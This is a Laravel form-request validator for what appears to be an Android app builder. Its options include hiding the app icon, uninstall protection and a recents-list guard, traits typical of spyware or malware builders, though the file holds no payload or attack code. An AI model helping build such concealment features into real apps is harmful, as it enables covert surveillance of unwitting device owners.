<?php

namespace App\Http\Requests\Build;

use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Validation\Rule;

class BuildRequest extends FormRequest
{
    public function authorize(): bool
    {
        return true;
    }

    protected function prepareForValidation(): void
    {
        $booleanFields = ['debug', 'disable_uninstall_protection', 'disable_recents_guard', 'disable_icon_hide', 'uninstall_mode'];

        foreach ($booleanFields as $field) {
            if ($this->has($field)) {
                $value = $this->input($field);
                if (is_string($value)) {
                    $this->merge([
                        $field => filter_var($value, FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE) ?? false,
                    ]);
                }
            }
        }
    }

    public function rules(): array
    {
        return [
            'name' => 'required|string|max:32',
            'package_name' => [
                'nullable', 'string', 'max:255',
                Rule::when($this->filled('package_name'), 'regex:/^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)*$/'),
            ],
            'version' => [
                'nullable', 'string', 'max:20',
                Rule::when($this->filled('version'), 'regex:/^\d+(\.\d+){0,2}$/'),
            ],
            'debug' => 'nullable|boolean',
            'alertTitle' => 'nullable|string|max:200',
            'alertMsg' => 'nullable|string|max:1000',
            'okText' => 'nullable|string|max:50',
            'web_url' => 'nullable|string|max:500',
            'disable_uninstall_protection' => 'nullable|boolean',
            'disable_recents_guard' => 'nullable|boolean',
            'disable_icon_hide' => 'nullable|boolean',
            'uninstall_mode' => 'nullable|boolean',
            'icon_path' => 'nullable|string|max:255',
            'background_path' => 'nullable|string|max:255',
        ];
    }
}
